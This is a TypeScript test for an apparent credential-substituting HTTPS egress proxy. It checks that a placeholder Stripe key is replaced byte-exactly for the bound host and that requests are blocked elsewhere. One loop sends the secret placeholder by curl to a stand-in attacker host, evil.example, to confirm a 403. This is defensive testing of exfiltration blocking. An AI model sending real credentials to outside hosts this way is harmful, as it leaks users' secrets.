/**
 * reorigination-wire — the bytes a released request carries upstream on the
 * TLS-inspected leg, against a STRICT listener (confidentiality.md §7.1,
 * 2026-10-05).
 *
 * The beta-tester tour: `curl -u '<STRIPE_KEY placeholder>:' -G -d limit=100
 * https://api.stripe.com/v1/customers`, released once by the human, reached
 * Stripe with TWO Host headers (the client's `Host:` and the proxy's own
 * lowercase `host:`), and Stripe's nginx answered a plain 400. The suites
 * before this one recorded with node's https server, which tolerates a
 * duplicate Host, and checked only the Authorization value.
 *
 * Here the listener reads RAW bytes and answers 400 the way nginx does
 * (a second Host, a malformed line, Content-Length with Transfer-Encoding),
 * and the oracle is plain curl itself: the REAL curl runs once through the
 * session proxy with the placeholder (`-u "<symbol>:"`, the tour's form) and
 * once straight to the listener with the real value, and the two heads must
 * be byte-identical apart from the one line the proxy adds
 * (`Accept-Encoding: identity`). The same for a POST body and a Bearer
 * header. An unbound host gets a 403 and no byte (the invariant).
 *
 * A real NetProxy over a REAL ArbiterServer through the production adapter;
 * axes are explicit server options (secrets: confidentiality ON, integrity
 * OFF). GATED on openssl + curl. Mandu-new (no reference origin).
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { createServer as createTlsServer, type TLSSocket } from "node:tls";
import { once } from "node:events";
import type { AddressInfo } from "node:net";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { execFile, spawnSync } from "node:child_process";

import { NetProxy } from "../../src/proxy.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../src/arbiter-client.js";
import { MockSites } from "../../src/mock-sites.js";
import { ensureCa, leafForHost, opensslAvailable } from "../../src/ca.js";

const REPO = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..", "..");
const OPENSSL = opensslAvailable();
const HAS_CURL = spawnSync("curl", ["--version"], { stdio: "ignore" }).status === 0;
const KEY = "sk_live_fake_REORIGIN_7d3a";

interface Seen { head: string; body: string; status: number }

/**
 * A raw HTTPS/1.1 listener for `host` that records each request's head and
 * body as bytes and is as strict as nginx about the head: exactly one Host,
 * well-formed header lines (no folding, no whitespace before the colon),
 * never both Content-Length and Transfer-Encoding. A violation is answered
 * `400` (recorded too).
 */
async function strictListener(dir: string, host: string) {
  const ca = ensureCa(join(dir, `ca-${host}`));
  const leaf = leafForHost(ca, host);
  const seen: Seen[] = [];
  const server = createTlsServer({ key: leaf.keyPem, cert: leaf.certPem }, (sock: TLSSocket) => {
    let buf = Buffer.alloc(0);
    sock.on("data", (d: Buffer) => {
      buf = Buffer.concat([buf, d]);
      for (;;) {
        const end = buf.indexOf("\r\n\r\n");
        if (end === -1) return;
        const head = buf.subarray(0, end + 4).toString("latin1");
        const lines = head.slice(0, -4).split("\r\n");
        const fields = lines.slice(1);
        const named = (n: string): string[] => fields.filter((l) => l.toLowerCase().startsWith(`${n}:`)).map((l) => l.slice(n.length + 1).trim());
        const len = Number(named("content-length")[0] ?? "0");
        if (buf.length < end + 4 + len) return;
        const body = buf.subarray(end + 4, end + 4 + len).toString("latin1");
        buf = buf.subarray(end + 4 + len);
        const bad =
          !/^[A-Z]+ \S+ HTTP\/1\.1$/.test(lines[0]!) ||
          fields.some((l) => !/^[!#$%&'*+.^_`|~0-9A-Za-z-]+:[ \t]?[^\r\n]*$/.test(l) || /^[ \t]/.test(l)) ||
          named("host").length !== 1 ||
          named("content-length").length > 1 ||
          (named("content-length").length > 0 && named("transfer-encoding").length > 0);
        const status = bad ? 400 : 200;
        seen.push({ head, body, status });
        const out = bad ? "<html>400 Bad Request</html>" : '{"object":"list","data":[]}';
        sock.write(`HTTP/1.1 ${status} ${bad ? "Bad Request" : "OK"}\r\nContent-Type: ${bad ? "text/html" : "application/json"}\r\nContent-Length: ${out.length}\r\n\r\n${out}`);
      }
    });
    sock.on("error", () => {});
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  return { seen, port: (server.address() as AddressInfo).port, caPath: ca.certPath, close: () => server.close() };
}

/** Run curl; resolves with its `%{http_code}` (the body is discarded). */
function curl(args: string[]): Promise<string> {
  return new Promise((resolve) => {
    execFile("curl", ["-sS", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20", ...args], (_e, out, err) => resolve(`${out}${err ? ` ${err}` : ""}`.trim()));
  });
}

test(
  "a released placeholder reaches the bound host as the byte-exact request plain curl sends with the real value (one Host; Basic, Bearer and body); an unbound host gets a 403 and no byte",
  { skip: !OPENSSL ? "openssl unavailable" : !HAS_CURL ? "curl is not installed" : false, timeout: 60_000 },
  async () => {
    const { ArbiterServer } = (await import(join(REPO, "arbiter/ipc/server.ts"))) as {
      ArbiterServer: new (o: Record<string, unknown>) => { listen(): Promise<void>; close(): Promise<void> };
    };
    const { ArbiterClient } = (await import(join(REPO, "arbiter/ipc/client.ts"))) as {
      ArbiterClient: new (path: string) => RealArbiterClient & {
        connect(): Promise<void>; close(): void;
        registerSecret(a: { path: string; home?: string }): Promise<{ symbol: string | null; reason: string; twin?: string }>;
      };
    };
    const dir = mkdtempSync(join(tmpdir(), "mdu-np-reorigin-"));
    const envFile = join(dir, ".env");
    writeFileSync(envFile, `PORT=3000\nSTRIPE_KEY=${KEY}\n`);
    const server = new ArbiterServer({
      socketPath: join(dir, "a.sock"), humanSocketPath: join(dir, "human", "h.sock"), dbPath: join(dir, "db.sqlite"),
      eventDir: join(dir, "events"), log: () => {}, adminPolicyDir: null, packDir: null,
      confidentiality: true, integrity: false,
      policyDocument: { version: 1, paths: [{ path: envFile, level: "no-model", bindings: ["api.stripe.com"] }] },
    });
    await server.listen();
    const data = new ArbiterClient(join(dir, "a.sock"));
    await data.connect();
    const human = new ArbiterClient(join(dir, "human", "h.sock"));
    const stripe = await strictListener(dir, "api.stripe.com");
    const evil = await strictListener(dir, "evil.example");
    const sites = MockSites.fromYaml([
      "hosts:",
      "  - host: api.stripe.com", `    tls_to: 127.0.0.1:${stripe.port}`, `    tls_ca: ${JSON.stringify(stripe.caPath)}`,
      "  - host: evil.example", `    tls_to: 127.0.0.1:${evil.port}`, `    tls_ca: ${JSON.stringify(evil.caPath)}`,
      "",
    ].join("\n"));
    const caDir = join(dir, "mitm");
    const proxy = new NetProxy({ allowThisMachine: true,
      arbiter: new ArbiterClientAdapter(data, human), log: () => {}, sessionId: "sess-reorigin", mockSites: sites, mitm: { caDir },
      // A clean session: the binding is the standing release.
      attributeHolders: () => [{ procKey: "7300-1", ancestors: [] }],
    });
    try {
      const port = await proxy.listen(0);
      const reg = await data.registerSecret({ path: envFile });
      assert.ok(reg.twin, reg.reason);
      const sym = /STRIPE_KEY='?(\$MDU:[^'\s]+)/.exec(reg.twin!)![1]!;
      assert.match(sym, /^\$MDU:nomodel_Read\[[0-9a-f]+\]\.STRIPE_KEY$/);

      const viaProxy = ["-x", `http://127.0.0.1:${port}`, "--cacert", join(caDir, "mandu-egress-ca.pem")];
      const direct = ["--connect-to", `api.stripe.com:443:127.0.0.1:${stripe.port}`, "--cacert", stripe.caPath];
      // Each request: through the proxy with the placeholder, then plain curl
      // with the real value (the oracle), the same arguments otherwise.
      const forms: Array<{ name: string; args: (v: string) => string[] }> = [
        { name: "the tour's -u", args: (v) => ["-u", `${v}:`, "-G", "-d", "limit=100", "https://api.stripe.com/v1/customers"] },
        { name: "a Bearer header", args: (v) => ["-H", `Authorization: Bearer ${v}`, "https://api.stripe.com/v1/balance"] },
        { name: "a POST body", args: (v) => ["-u", `${v}:`, "-d", "amount=100", "-d", `note=${v}`, "https://api.stripe.com/v1/charges"] },
      ];
      for (const f of forms) {
        const before = stripe.seen.length;
        assert.equal(await curl([...viaProxy, ...f.args(sym)]), "200", `${f.name}: through the proxy`);
        assert.equal(await curl([...direct, ...f.args(KEY)]), "200", `${f.name}: plain curl`);
        assert.equal(stripe.seen.length, before + 2, f.name);
        const [proxied, plain] = stripe.seen.slice(before);
        assert.equal(proxied!.status, 200, `${f.name}: the strict listener accepted the proxied request:\n${proxied!.head}`);
        // THE ORACLE: byte-identical to plain curl with the real value, apart
        // from the identity line the proxy adds (no Accept-Encoding from curl).
        assert.equal(proxied!.head, plain!.head.replace(/\r\n\r\n$/, "\r\nAccept-Encoding: identity\r\n\r\n"), f.name);
        assert.equal(proxied!.body, plain!.body, `${f.name}: the body`);
      }
      // Spelled out once for the tour's form.
      const tour = stripe.seen[0]!.head;
      assert.match(tour, new RegExp(`\\r\\nAuthorization: Basic ${Buffer.from(`${KEY}:`).toString("base64").replace(/[+/=]/g, "\\$&")}\\r\\n`));
      assert.equal((tour.match(/^host:/gim) ?? []).length, 1);

      // The unbound host: 403 from the proxy, nothing reaches it.
      for (const f of forms) {
        const args = f.args(sym).map((a) => a.replace("api.stripe.com", "evil.example"));
        assert.equal(await curl([...viaProxy, ...args]), "403", `${f.name} to evil.example`);
      }
      assert.deepEqual(evil.seen, []);
      // And the value reached nobody but the bound host (its plain-curl copies included).
      const all = [...stripe.seen.filter((_, i) => i % 2 === 0), ...evil.seen].map((s) => s.head + s.body).join("\n");
      assert.ok(!all.includes(sym), "the placeholder was never forwarded");
    } finally {
      await proxy.close();
      stripe.close();
      evil.close();
      data.close();
      human.close();
      await server.close();
      rmSync(dir, { recursive: true, force: true });
    }
  },
);
